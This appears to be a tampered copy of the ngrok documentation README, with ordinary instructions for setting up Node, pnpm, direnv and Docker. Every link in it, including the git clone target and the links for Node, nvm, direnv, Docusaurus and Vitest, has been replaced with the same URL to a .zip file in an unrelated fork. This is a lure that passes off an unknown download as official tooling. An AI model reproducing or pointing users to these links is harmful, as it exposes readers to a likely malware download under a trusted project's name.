# [ngrok docs](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip)

Source code for [ngrok docs](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip); feel free to suggest changes and improvements to our documentation!

## Contributing

See our [Contribution Guidelines](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip) for detailed instructions on how to help improve ngrok documentation.

## Getting Started

ngrok is built using [Docusaurus 3](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip).

The fastest and safest (isolated) way to run the documentation is with the Docker command below, then browse to http://localhost:3000/docs.

```sh
docker run --rm -p 3000:3000 -it --name=ngrokDocs -v "./:/app" -w "/app" --platform=linux/amd64 guergeiro/pnpm:20-8-alpine sh -c "apk add direnv; direnv allow; pnpm install; pnpm run start"
```

Otherwise, you can install and run everything on your local host.

Prerequisites required:

- [Node 20](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip)
- [pnpm 9](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip)
- [nvm](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip)

We use [direnv](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip) to assist you with setting up all of the required tooling.

<details>
  <summary>Prefer to install and manage the tooling yourself?</summary>

1. Install [nvm](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip) or your node version manager of choice.
2. Ensure that `node 20` is installed. With `nvm`, run `nvm install`.
3. Enable `pnpm` with `corepack`: `corepack enable pnpm`
4. Install `pnpm` with `corepack`: `corepack install`
5. Install project dependencies with `pnpm`: `pnpm install`
</details>

First, install `direnv`:

| OS     | command                 |
| ------ | ----------------------- |
| macOS  | brew install direnv     |
| ubuntu | sudo apt install direnv |

For all other OSes, see the [direnv installation guide](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip).

Don't forget to [set up direnv integration with your shell](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip).

Next, clone the repo and move into the directory:

```sh
git clone https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip
cd ngrok-docs
```

Next, run:

```sh
direnv allow
```

This will install `nvm` (if not already installed) as well as set the correct `node` and `pnpm` versions for you.

Once you have the pre-requisites installed, local development happens by running:

```sh
pnpm run start
```

Our docs mostly use markdown and MDX, you can make yourself familiar with docusaurus [documentation](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip) for more significant features / changes.

## Building ngrok-docs

To ensure your changes work before submitting a pr, please run the following before submission:

```
cd ngrok-docs
pnpm run fmt
pnpm run test
pnpm run typecheck
pnpm run build
```

## Testing

We use [Vitest](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip) for testing. To run the tests, use:

```sh
pnpm run test
```

To run tests in watch mode during development:

```sh
pnpm run test:watch
```

## Looking for support?

For bug reports, feature request, questions and community support please ooen an issue or discussion in our [ngrok Community](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip).
To report a problem with our documentation, please open a new [Github issue](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip).
